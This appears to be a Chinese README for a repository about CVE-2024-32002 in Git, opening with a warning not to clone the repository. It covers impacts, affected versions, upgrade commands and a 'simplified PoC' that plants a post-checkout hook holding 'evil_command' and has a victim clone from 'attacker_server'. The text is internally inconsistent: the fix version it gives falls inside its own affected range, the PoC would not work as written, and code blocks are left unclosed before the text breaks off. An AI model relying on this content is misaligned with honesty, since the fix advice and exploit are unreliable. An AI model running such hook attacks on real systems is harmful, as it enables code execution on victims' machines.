# CVE-2024-32002 漏洞概述(⚠️注意！：请不要clone此仓库！！！⚠️)

## 描述

CVE-2024-32002 是在 Git 软件中发现的一个严重安全漏洞。该漏洞允许远程攻击者通过特制的 Git 仓库在受影响的系统上执行任意代码。此漏洞存在于 Git 处理特定仓库操作的过程中，由于缺乏对输入数据的充分验证，导致了远程代码执行（RCE）的风险。

## 影响

成功利用此漏洞可能导致：
- **远程代码执行（RCE）**：攻击者能够在受影响的系统上执行任意代码。
- **系统控制**：攻击者可能获得受影响系统的完全控制权。
- **数据泄露和篡改**：未经授权的访问和修改敏感数据。
- **进一步攻击**：在受害者网络内发起进一步的攻击。

## 受影响的版本

以下版本的 Git 软件受到 CVE-2024-32002 的影响：
Versions
Default Status: unknown
affected at = 2.45.0  
affected at = 2.44.0  
affected at >= 2.43.0, < 2.43.4  
affected at >= 2.42.0, < 2.42.2  
affected at = 2.41.0  
affected at >= 2.40.0, < 2.40.2  
affected at < 2.39.4  

## 漏洞详情
[CVE-2024-32002 详细信息](https://www.cve.org/CVERecord?id=CVE-2024-32002)
漏洞存在于 Git 处理特定仓库操作的过程中。当用户克隆或与恶意的 Git 仓库交互时，攻击者可以通过特制的仓库或提交历史注入恶意代码。由于缺乏充分的输入验证，这些恶意代码在执行仓库操作时可以绕过安全检查，导致任意代码执行。

### 攻击向量

1. **恶意仓库**：攻击者创建一个包含特制提交历史或文件的恶意 Git 仓库。
2. **社会工程**：攻击者诱导受害者克隆或与该恶意仓库交互。
3. **代码执行**：在受害者执行某些 Git 操作（如 `git clone`、`git pull`）时，恶意代码被触发并执行。

## 缓解措施

### 升级

强烈建议用户升级到包含此漏洞修补程序的最新版本 Git 软件。修复版本如下：
- Git 2.40.1 及更高版本

升级命令如下：

```bash
# 对于 macOS
brew upgrade git

# 对于 Ubuntu/Debian
sudo apt-get update
sudo apt-get install git

# 对于 CentOS/RHEL
sudo yum update git

## 利用方式

针对 CVE-2024-32002 的概念验证（PoC）已经公开。以下是一个简化的 PoC 示例：

```bash
# 攻击者创建恶意仓库
git init malicious-repo
cd malicious-repo
echo 'malicious content' > payload.txt
git add payload.txt
git commit -m "Add malicious payload"

# 通过注入恶意代码的提交历史触发漏洞
git config --local core.hooksPath .githooks
echo 'evil_command' > .githooks/post-checkout
git add .githooks
git commit -m "Add post-checkout hook"

# 受害者克隆恶意仓库时触发漏洞
git clone attacker_server/malicious-repo

以下是关于 CVE-2024-32002 漏洞的详细：

